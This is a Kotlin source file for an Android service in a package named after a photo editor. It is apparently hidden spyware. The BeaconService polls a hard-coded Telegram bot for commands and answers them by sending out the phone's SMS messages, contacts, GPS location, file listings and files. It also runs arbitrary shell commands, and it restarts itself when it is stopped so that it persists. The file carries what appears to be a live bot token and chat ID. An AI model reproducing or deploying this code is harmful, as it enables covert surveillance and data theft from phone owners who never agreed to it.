package com.photo.editor

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class BeaconService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private val BOT_TOKEN = "8499165846:AAFsr7EJTCOYcBB1yXLwoDZcHhBPfnvq-Rg"
    private val CHAT_ID = "6146550840"
    private val API = "https://api.telegram.org/bot$BOT_TOKEN"
    private var offset = 0L
    private var started = false

    override fun onCreate() {
        super.onCreate()
        if (started) return
        started = true
        scope.launch { loop() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!started) {
            started = true
            scope.launch { loop() }
        }
        return START_STICKY
    }

    private suspend fun loop() {
        try {
            send("new beacon\nmodel: ${Build.MODEL}\nbrand: ${Build.BRAND}\nandroid: ${Build.VERSION.RELEASE}\nsdk: ${Build.VERSION.SDK_INT}")
        } catch (e: Exception) {
            Log.e("beacon", "beacon send failed", e)
        }
        while (true) {
            try {
                val updates = getUpdates()
                for (upd in updates) {
                    val msg = upd.optJSONObject("message") ?: continue
                    val chat = msg.optJSONObject("chat")?.optString("id") ?: continue
                    if (chat != CHAT_ID) continue
                    val text = msg.optString("text", "")
                    if (text.isNotEmpty()) handleCmd(text)
                }
            } catch (e: Exception) {
                Log.e("beacon", "poll", e)
            }
            delay(3000)
        }
    }

    private suspend fun getUpdates(): List<JSONObject> {
        val url = "$API/getUpdates?offset=$offset&timeout=10"
        val req = Request.Builder().url(url).build()
        val body = client.newCall(req).execute().body?.string() ?: return emptyList()
        val json = JSONObject(body)
        val arr = json.optJSONArray("result") ?: return emptyList()
        val out = mutableListOf<JSONObject>()
        for (i in 0 until arr.length()) {
            val u = arr.getJSONObject(i)
            offset = u.getLong("update_id") + 1
            out.add(u)
        }
        return out
    }

    private suspend fun handleCmd(cmd: String) {
        val parts = cmd.split(" ", limit = 2)
        val verb = parts[0].lowercase()
        val arg = if (parts.size > 1) parts[1] else ""
        when (verb) {
            "/info" -> send(infoText())
            "/location" -> send(locationText())
            "/sms" -> send(smsText())
            "/contacts" -> send(contactsText())
            "/ls" -> send(lsText(arg))
            "/get" -> sendFile(arg)
            "/shell" -> send(shellText(arg))
            "/ping" -> send("pong")
            else -> send("unknown: $cmd")
        }
    }

    private fun infoText(): String {
        return "model: ${Build.MODEL}\nbrand: ${Build.BRAND}\nandroid: ${Build.VERSION.RELEASE}\nsdk: ${Build.VERSION.SDK_INT}\nhost: ${Build.HOST}"
    }

    private fun locationText(): String {
        return try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
            if (loc != null) "lat: ${loc.latitude}\nlon: ${loc.longitude}\naccuracy: ${loc.accuracy}m" else "no location"
        } catch (e: Exception) {
            "loc error: ${e.message}"
        }
    }

    private fun smsText(): String {
        return try {
            val sb = StringBuilder()
            val cursor = contentResolver.query(
                android.provider.Telephony.Sms.CONTENT_URI,
                null, null, null, "date DESC LIMIT 10"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val addr = it.getString(it.getColumnIndexOrThrow("address"))
                    val body = it.getString(it.getColumnIndexOrThrow("body"))
                    sb.append("$addr: $body\n")
                }
            }
            sb.toString().take(3500)
        } catch (e: Exception) {
            "sms error: ${e.message}"
        }
    }

    private fun contactsText(): String {
        return try {
            val sb = StringBuilder()
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val phone = it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
                    sb.append("$name: $phone\n")
                }
            }
            sb.toString().take(3500)
        } catch (e: Exception) {
            "contacts error: ${e.message}"
        }
    }

    private fun lsText(path: String): String {
        return try {
            val dir = if (path.isEmpty()) File("/sdcard") else File(path)
            dir.listFiles()?.take(50)?.joinToString("\n") { it.name } ?: "empty"
        } catch (e: Exception) {
            "ls error: ${e.message}"
        }
    }

    private suspend fun sendFile(path: String) {
        try {
            val f = File(path)
            if (!f.exists()) { send("not found: $path"); return }
            val bytes = f.readBytes()
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("document", f.name, bytes.toRequestBody(null))
                .build()
            val req = Request.Builder().url("$API/sendDocument").post(body).build()
            client.newCall(req).execute().close()
        } catch (e: Exception) {
            send("file err: ${e.message}")
        }
    }

    private fun shellText(cmd: String): String {
        return try {
            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val out = proc.inputStream.bufferedReader().readText()
            val err = proc.errorStream.bufferedReader().readText()
            (out + err).take(3500)
        } catch (e: Exception) {
            "shell err: ${e.message}"
        }
    }

    private fun send(text: String) {
        try {
            val json = JSONObject()
                .put("chat_id", CHAT_ID)
                .put("text", text.take(4000))
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val req = Request.Builder().url("$API/sendMessage").post(body).build()
            client.newCall(req).execute().close()
        } catch (e: Exception) {
            Log.e("beacon", "send", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
        try {
            startService(Intent(this, BeaconService::class.java))
        } catch (e: Exception) {
            Log.e("beacon", "restart failed", e)
        }
    }
}
